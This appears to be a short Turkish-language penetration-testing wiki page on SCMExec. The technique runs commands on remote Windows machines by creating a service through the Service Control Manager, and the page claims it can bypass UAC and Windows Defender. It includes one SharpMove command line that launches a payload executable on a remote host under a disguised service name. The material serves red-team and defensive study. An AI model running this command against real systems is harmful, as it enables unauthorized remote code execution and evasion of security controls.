# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec**, komutu çalıştıran bir service oluşturmak için Service Control Manager (SCM) kullanarak uzak sistemlerde komut çalıştırmaya yönelik bir tekniktir. Bu yöntem, User Account Control (UAC) ve Windows Defender gibi bazı security controls'leri atlayabilir.

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):<sup>[[1]](#references)</sup>

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

## References

- [1] [SharpMove - GitHub repository](https://github.com/0xthirteen/SharpMove)

{{#include ../../banners/hacktricks-training.md}}
